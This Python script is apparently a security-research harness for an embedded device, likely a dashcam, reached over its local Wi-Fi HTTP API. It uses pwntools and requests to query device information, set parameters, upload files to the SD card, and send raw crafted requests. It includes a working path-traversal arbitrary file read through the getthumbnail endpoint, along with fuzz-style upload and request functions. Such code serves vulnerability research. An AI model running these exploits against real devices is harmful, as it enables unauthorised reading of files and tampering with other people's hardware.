import requests
from pwn import *
from util import *

# Common function to send a GET request and return the response
def send_get_request(url):
    headers = {
        'Connection': 'close',
        'Accept-Encoding': '',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014)',
        'Host': '192.168.169.1'
    }
    
    try:
        info(f"Sending HTTP request to {url}")
        # Send the GET request with the headers
        response = requests.get(url, headers=headers)
        response.raise_for_status()  # Will raise HTTPError for bad responses
        return response.content.decode('utf-8')
    except requests.exceptions.RequestException as e:
        warn(f"Request failed: {e}")
        return None

# Function to get product info
def get_product_info():
    url = "http://192.168.169.1/app/getproductinfo"
    response_data = send_get_request(url)
    
    if response_data:
        pretty_print_json_response(response_data)

# Function to fetch RTSP media info
def get_media_info():
    url = "http://192.168.169.1/app/getmediainfo"
    response_data = send_get_request(url)
    
    if response_data:
        pretty_print_json_response(response_data)

# Function to fetch device attributes
def get_device_attr():
    url = "http://192.168.169.1/app/getdeviceattr"
    response_data = send_get_request(url)
    
    if response_data:
        pretty_print_json_response(response_data)

# Function to fetch SD info
def get_sd_info():
    # Define the URL for getting SD card info
    url = "http://192.168.169.1/app/getsdinfo"
    
    # Use the common function to send the GET request
    response_data = send_get_request(url)

    # If we received a valid response, handle and pretty-print the JSON
    if response_data:
        pretty_print_json_response(response_data)

# Function to fetch battery info
def get_battery_info():
    # Define the URL for getting SD card info
    url = "http://192.168.169.1/app/getbatteryinfo"
    
    # Use the common function to send the GET request
    response_data = send_get_request(url)

    # If we received a valid response, handle and pretty-print the JSON
    if response_data:
        pretty_print_json_response(response_data)

# Function to fetch current length of recording
def get_rec_duration():
    # Define the URL for getting SD card info
    url = "http://192.168.169.1/app/getrecduration"
    
    # Use the common function to send the GET request
    response_data = send_get_request(url)

    # If we received a valid response, handle and pretty-print the JSON
    if response_data:
        pretty_print_json_response(response_data)

# sets param using setparamvalue
def set_param(name, value):
    # language value in memory can be fetched at *(int*)(*(int*)(0xc09afa54) + 0x14)
        # Define the URL
    url = f"http://192.168.169.1/app/setparamvalue?param={name}&value={to_signed_32bit(value)}"

    # Define the query parameters
    params = {
        'folder' : '/mnt'
    }

    # Define the headers
    headers = {
        'Connection': 'close',
        'Accept-Encoding': '',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014)',
        'Host': '192.168.169.1'
    }

    # Send the GET request with the headers and parameters
    response = requests.get(url, headers=headers, params=params)

    # Check if the request was successful
    if response.status_code == 200:
        success("Request successful")
        # Optionally, print the content or save it to a file
        info(response.content.decode('utf-8'))
    else:
        info(f"Request failed with status code {response.status_code}")

# gets param using getparamvalue
def get_param(name):
        # language value in memory can be fetched at *(int*)(*(int*)(0xc09afa54) + 0x14)
        # Define the URL
    url = f"http://192.168.169.1/app/getparamvalue?param={name}"

    # Define the query parameters
    params = {
        'folder' : '/mnt'
    }

    # Define the headers
    headers = {
        'Connection': 'close',
        'Accept-Encoding': '',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014)',
        'Host': '192.168.169.1'
    }

    # Send the GET request with the headers and parameters
    response = requests.get(url, headers=headers, params=params)

    # Check if the request was successful
    if response.status_code == 200:
        success("Request successful")
        return response.content
    else:
        info(f"Request failed with status code {response.status_code}")
        return response.content

def upload_file_to_sd(file_path, filename=None):
    # Define the IP address and port
    ip = "192.168.169.1"
    port = 80
    
    # Determine the filename and the length of the file
    if filename is None:
        filename = os.path.basename(file_path)
    file_length = str(len(open(file_path, 'rb').read()))
    
    # Construct the initial POST request headers
    initial_request = f"POST /upload/mnt/sdcard/{file_length} HTTP/1.1\r\n\r\n"
    
    # Read the file content
    with open(file_path, 'rb') as file:
        file_content = file.read()
    
    # Construct the file upload POST request headers
    post_request = (
        f"POST /upload/mnt/sdcard/{file_length}?filename=\"/{filename}\" HTTP/1.1\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
    )
    
    # Construct the additional POST request
    boundary = "---------------------------1723331094431338331860300242"
    additional_post_request = (
        f"POST /upload/mnt/sdcard/{file_length} HTTP/1.1\r\n"
        f"Host: {ip}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {355 + len(file_content)}\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"{boundary}\r\n"
        "Content-Disposition: form-data; name=\"name\"\r\n\r\n"
        "/mnt/sdcard/\r\n"
        f"{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        + file_content.decode('latin1') + "\r\n"
        f"{boundary}--\r\n"
    )
    
    # Open the socket connection and send the requests
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        
        # Send the initial POST request
        s.sendall(initial_request.encode())
        info("Initial POST request sent.")
        
        # Send the file upload POST request with the file content
        s.sendall(post_request.encode() + file_content)
        info("File upload POST request sent.")
        
        # Send the additional POST request
        s.sendall(additional_post_request.encode())
        info("Additional POST request sent.")

def http_get_file_request(timeout):
        # Define the IP address and port
    ip = b"192.168.169.1"
    port = 80

    # Define the filename with quotes
    filename = b"cheese"

    # Construct the raw HTTP GET request
    request = b"GET /mnt/" + filename + b" HTTP/1.1\r\n"
    request += b"Host: " + ip + b"\r\n"
    request += b"Connection: close\r\n"
    request += b"User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014)\r\n"
    request += b"Accept-Encoding: \r\n"
    request += b"\r\n"

    info(f"Request length: {len(request)}")

    # info the raw request for debugging
    info("Raw HTTP Request:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        s.settimeout(timeout)
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # Receive the response
            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk

        except socket.timeout:
            info(f"Socket timed out after {timeout} second(s).")
        
        except Exception as e:
            info(f"An error occurred: {e}")

def do_index_html_req(method):
    # Define the IP address and port
    ip = b"192.168.169.1"
    port = 80

    # Construct the raw HTTP GET request
    request = method + b" /index.html HTTP/1.1\r\n"
    request += b"\r\n"

    info(f"Request length: {len(request)}")

    # info the raw request for debugging
    info("Raw HTTP Request:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # Receive the response
            # info(s.recv(4096).decode('utf-8'))
       
        except Exception as e:
            info(f"An error occurred: {e}")

def read_file_from_mnt():
    # Define the URL
    url = "http://192.168.169.1/mnt/data/cdr_config.cfg"

    # Define the headers
    headers = {
        'Connection': 'close',
        'Accept-Encoding': '',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014)',
        'Host': '192.168.169.1'
    }

    # Send the GET request with the headers and parameters
    response = requests.get(url, headers=headers)

    # Check if the request was successful
    if response.status_code == 200:
        success("Request successful")
        # Optionally, print the content or save it to a file
        info(response.content.decode('utf-8'))
    else:
        info(f"Request failed with status code {response.status_code}")

def read_thumbnail_arb_read(file_path, save_path):
    # Define the URL
    url = f"http://192.168.169.1/app/getthumbnail/?filename=/mnt/sdcard/test.jpg/../../..{file_path}"

    # Define the headers
    headers = {
        'Connection': 'close',
        'Accept-Encoding': '',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014)',
        'Host': '192.168.169.1'
    }

    # Send the GET request with the headers and parameters
    response = requests.get(url, headers=headers)

    # Check if the request was successful
    if response.status_code == 200:
        success("Request successful")

        # Save the content to a file
        with open(save_path, 'wb') as file:
            file.write(response.content)
        info(f"Content saved to {save_path}")
    else:
        info(f"Request failed with status code {response.status_code}")
